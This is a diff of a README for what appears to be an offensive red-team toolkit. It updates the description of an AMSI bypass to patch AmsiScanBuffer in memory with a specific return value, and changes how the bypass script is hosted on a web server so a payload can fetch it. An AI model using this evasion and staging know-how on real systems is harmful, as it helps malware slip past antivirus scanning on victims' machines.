@@ -4,7 +4,7 @@
 
 | File | Purpose |
 |---|---|
-| `amsi-bypass.ps1` | PowerShell — patches `AmsiOpenSession` in memory via `VirtualProtect` + `xor rax,rax` |
+| `amsi-bypass.ps1` | PowerShell — patches `AmsiScanBuffer` in memory via `VirtualProtect` + `mov eax,0x80070057; ret` |
 | `amsi-techniques.md` | Reference — three AMSI bypass techniques with code |
 
 ## Usage
@@ -21,7 +21,8 @@ Or paste it directly into the session before running any detected script.
 
 Serve `amsi-bypass.ps1` on your HTTP server:
 ```bash
-python3 -m http.server 80
+sudo systemctl start apache2
+sudo cp amsi-bypass.ps1 /var/www/html/
 ```
 
 Then in your payload (`run.txt` or equivalent):
